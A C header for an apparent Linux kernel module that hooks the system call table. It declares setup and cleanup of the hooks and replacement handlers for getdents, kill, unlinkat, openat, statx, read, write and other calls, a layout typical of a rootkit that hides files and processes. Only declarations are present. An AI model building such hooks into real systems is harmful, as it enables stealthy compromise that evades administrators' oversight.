#pragma once
#include <linux/fs.h> // required for syscall numbers (__NR_...)
#include <linux/module.h>

typedef asmlinkage int64_t syscall_t(const struct pt_regs *);

bool hooks_clean(uint64_t **systable);
bool hooks_setup(uint64_t **systable);
syscall_t *hooks_find_orig(uint16_t num);

asmlinkage int64_t h_newfstatat(const struct pt_regs *r);
asmlinkage int64_t h_getdents64(const struct pt_regs *r);
asmlinkage int64_t h_getdents(const struct pt_regs *r);
asmlinkage int64_t h_unlinkat(const struct pt_regs *r);
asmlinkage int64_t h_openat(const struct pt_regs *r);
asmlinkage int64_t h_statx(const struct pt_regs *r);
asmlinkage int64_t h_chdir(const struct pt_regs *r);
asmlinkage int64_t h_write(const struct pt_regs *r);
asmlinkage int64_t h_read(const struct pt_regs *r);
asmlinkage int64_t h_open(const struct pt_regs *r);
asmlinkage int64_t h_kill(const struct pt_regs *r);
